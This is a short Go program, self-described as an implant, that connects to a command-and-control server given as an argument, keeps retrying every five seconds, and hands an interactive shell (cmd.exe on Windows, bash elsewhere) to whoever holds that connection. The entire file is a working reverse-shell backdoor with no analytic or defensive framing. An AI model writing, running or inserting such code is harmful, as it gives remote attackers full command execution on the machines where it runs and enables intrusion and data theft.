package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run implant.go <C2_SERVER_IP:PORT>")
		fmt.Println("Example: go run implant.go 127.0.0.1:9090")
		os.Exit(1)
	}

	c2Server := os.Args[1]

	fmt.Printf("[*] Implant active. Calling home to %s...\n", c2Server)

	for {
		conn, err := net.Dial("tcp", c2Server)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("[+] Connected to C2!")

		handleConnection(conn)

		conn.Close()
	}
}

func handleConnection(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/bash", "-i")
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
